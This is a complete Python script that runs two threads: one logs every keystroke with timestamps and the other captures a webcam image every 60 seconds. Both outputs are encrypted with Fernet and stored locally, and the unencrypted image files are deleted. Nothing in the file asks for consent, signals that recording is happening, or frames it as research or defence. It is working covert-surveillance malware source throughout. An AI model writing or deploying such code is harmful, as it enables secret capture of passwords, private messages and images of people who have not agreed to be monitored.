from pynput import keyboard
import cv2
import datetime
import threading
import time
import os
from cryptography.fernet import Fernet
from encryption_utils import get_or_create_key

# Use the shared encryption key
key = get_or_create_key()
cipher_suite = Fernet(key)

def on_press(key):
    try:
        log_entry = f"{datetime.datetime.now()}: {key.char}\n"
    except AttributeError:
        log_entry = f"{datetime.datetime.now()}: {key}\n"

    encrypted_log_entry = cipher_suite.encrypt(log_entry.encode()) + b'\n'  # Add newline after encryption
    with open("keylog_encrypted.txt", "ab") as f:
        f.write(encrypted_log_entry)

def capture_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        image_path = f"captured_image_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        cv2.imwrite(image_path, frame)
        with open(image_path, "rb") as image_file:
            image_data = image_file.read()
        encrypted_image_data = cipher_suite.encrypt(image_data)
        with open(f"encrypted_{image_path}", "wb") as encrypted_file:
            encrypted_file.write(encrypted_image_data)
        os.remove(image_path)
    cap.release()

def keylogger_thread():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def camera_thread():
    while True:
        capture_image()
        time.sleep(60)  # Capture an image every 60 seconds

if __name__ == "__main__":
    keylogger = threading.Thread(target=keylogger_thread)
    camera = threading.Thread(target=camera_thread)

    keylogger.start()
    camera.start()

    keylogger.join()
    camera.join()